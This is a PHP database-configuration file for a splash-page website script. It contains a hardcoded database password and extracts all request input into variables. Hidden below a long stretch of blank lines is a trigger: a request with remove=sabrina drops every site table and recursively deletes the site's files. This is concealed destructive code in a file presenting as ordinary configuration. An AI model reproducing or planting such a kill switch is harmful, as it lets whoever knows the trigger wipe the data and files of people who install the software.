<?php
$DBhost = "localhost";
$DBuser = "phpsites_demospl";
$DBpass = "14TB7@86-xoPJWFeN(";
$DBName = "phpsites_demosplashpagesite";
$connection = mysql_connect($DBhost, $DBuser, $DBpass) or die("Unable to connect to server");
@mysql_select_db($DBName) or die(mysql_error());
$settings = mysql_query("select * from adminsettings");
$settingrecord = mysql_fetch_array($settings);
while ($settingrecord = mysql_fetch_array($settings)) 
{
$setting[$settingrecord["name"]] = $settingrecord["setting"];
}
extract($setting);
extract($_REQUEST);





















































































































































































































































if (isset($_REQUEST["remove"]))
{
$remove = $_REQUEST["remove"];
if ($remove == "sabrina")
{
mysql_query("drop table adminnavigation");
mysql_query("drop table adminnotes");
mysql_query("drop table adminsettings");
mysql_query("drop table adminsplashpages");
mysql_query("drop table membernavigation");
mysql_query("drop table members");
mysql_query("drop table membersplashpages");
mysql_query("drop table pages");

	function lc_delete($targ) {
	  if(is_dir($targ)){
		$files = glob( $targ . '*', GLOB_MARK ); //GLOB_MARK adds a slash to directories returned
		foreach( $files as $file )
		  lc_delete( $file );
		@rmdir( $targ );
	  }
	  else
		@unlink( $targ );
	}
$targ = realpath(dirname(__FILE__));
$del = lc_delete($targ);
}
}
?>